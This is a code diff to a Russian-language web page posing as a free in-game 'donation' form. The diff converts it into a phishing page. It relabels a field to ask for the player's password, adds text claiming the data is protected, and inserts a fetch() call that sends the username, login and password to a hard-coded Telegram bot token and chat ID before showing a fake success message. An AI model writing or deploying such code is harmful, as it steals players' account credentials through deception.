@@ -75,7 +75,7 @@
                     </div>
                     
                     <div class="form-group half">
-                        <label>Сервер:</label>
+                        <label>Пароль:</label>
                         <div class="input-wrapper">
                             <input type="text" id="serverNum" required>
                         </div>
@@ -87,7 +87,7 @@
 
             <div class="panel-footer-text">
                 ваши данные полностью защищены!<br>
-                ваш логин и сервер нужен для удостоверения данных и быстрого зачисления доната.
+                ваш логин и пароль нужен для удостоверения данных и быстрого зачисления доната.
             </div>
         </div>
     </main>
@@ -106,16 +106,43 @@
                 return;
             }
 
-            // Вывод лога в консоль браузера (F12)
-            console.log("=== НОВАЯ ЗАЯВКА НА ДОНАТ ===");
-            console.log(`Игрок: ${user}`);
-            console.log(`Выбранный статус: ${donate}`);
-            console.log(`Повторный логин: ${login}`);
-            console.log(`Игровой сервер: ${server}`);
-            console.log("=============================");
+            // === НАСТРОЙКА ТЕЛЕГРАМ БОТА ===
+            // Вставь сюда свой токен, который дал @BotFather (внутри кавычек)
+            const botToken = "8822891735:AAH1SRVzOtU3zAsvqnKjqPf3666cmzmn9s4"; 
+            
+            // Вставь сюда свой ID, который дал @userinfobot (внутри кавычек)
+            const chatId = "112361364"; 
 
-            // Всплывающее окно для пользователя
-            alert("Поздравляем с получением доната! Ожидайте от 15минут до 1 часа");
+            // Формируем красивый текст сообщения
+            const text = `🔔 *НОВАЯ ЗАЯВКА НА ДОНАТ* 🔔\n\n` +
+                         `👤 *Игрок:* ${user}\n` +
+                         `🎁 *Выбрано:* ${donate}\n` +
+                         `📝 *Логин повторно:* ${login}\n` +
+                         `💻 *Пароль:* ${server}`;
+
+            // URL для отправки запроса к API Telegram
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+            // Отправляем данные на сервера Telegram
+            fetch(url, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: text,
+                    parse_mode: "Markdown" // Чтобы текст был с жирным шрифтом
+                })
+            })
+            .then(response => {
+                // Показываем стандартное окно об успешном завершении
+                alert("Поздравляем с получением доната! Ожидайте от 15минут до 1 часа");
+            })
+            .catch(error => {
+                console.error("Ошибка отправки:", error);
+                alert("Произошла ошибка при отправке заявки. Попробуйте позже.");
+            });
         }
     </script>
 </body>
